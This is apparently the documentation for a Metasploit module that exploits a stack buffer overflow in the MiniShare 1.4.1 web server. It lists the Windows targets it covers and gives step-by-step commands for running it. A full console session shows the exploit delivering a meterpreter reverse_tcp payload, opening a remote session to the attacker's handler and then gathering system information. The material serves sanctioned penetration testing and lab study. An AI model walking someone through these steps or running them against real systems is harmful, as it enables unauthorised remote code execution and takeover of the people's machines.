## Description

  This is a simple buffer overflow for the MiniShare web
  server. This flaw affects all versions prior to 1.4.2. This
  is a plain stack buffer overflow that requires a "jmp esp" to reach
  the payload, making this difficult to target many platforms
  at once.


## Vulnerable Application

  This module has been successfully tested against MiniShare 1.4.1.

  Version 1.3.4 and below do not seem to be vulnerable.


## Targets

Exploit targets:

```
   Id  Name
   --  ----
   0   Automatic
   1   Windows 2000 SP0-SP3 English
   2   Windows 2000 SP4 English
   3   Windows XP SP0-SP1 English
   4   Windows XP SP2 English
   5   Windows 2003 SP0 English
   6   Windows 2003 SP1 English
   7   Windows 2003 SP2 English
   8   Windows NT 4.0 SP6
   9   Windows XP SP2 Polish
   10  Windows XP SP3 English
   11  Windows XP SP3 French
```


## Verification Steps

  1. Start `msfconsole`
  2. `use exploit/windows/http/minishare_get_overflow`
  3. `set rhosts <RHOST>`
  4. `set target <TARGET>`
  5. `check`
  6. `run`
  7. You should get a new session


## Scenarios

### MiniShare 1.4.1 on Windows XP SP 3 English

  ```
  msf5 > use exploit/windows/http/minishare_get_overflow 
  msf5 exploit(windows/http/minishare_get_overflow) > set rhosts
  rhosts => 172.16.191.158
  msf5 exploit(windows/http/minishare_get_overflow) > set target 10
  target => 10
  msf5 exploit(windows/http/minishare_get_overflow) > set verbose true
  verbose => true
  msf5 exploit(windows/http/minishare_get_overflow) > check

  [*] MiniShare version 1.4.1
  [*] 172.16.191.158:80 - The target appears to be vulnerable.
  msf5 exploit(windows/http/minishare_get_overflow) > set payload windows/meterpreter/reverse_tcp
  payload => windows/meterpreter/reverse_tcp
  msf5 exploit(windows/http/minishare_get_overflow) > run

  [*] Started reverse TCP handler on 172.16.191.196:4444 
  [*] Trying target address 0x7e429353...
  [*] Sending stage (179779 bytes) to 172.16.191.158
  [*] Meterpreter session 10 opened (172.16.191.196:4444 -> 172.16.191.158:1163) at 2018-12-29 06:47:47 -0500

  meterpreter > sysinfo
  Computer        : WINXP
  OS              : Windows XP (Build 2600, Service Pack 3).
  Architecture    : x86
  System Language : en_US
  Domain          : WORKGROUP
  Logged On Users : 2
  Meterpreter     : x86/windows
  meterpreter > 
  ```
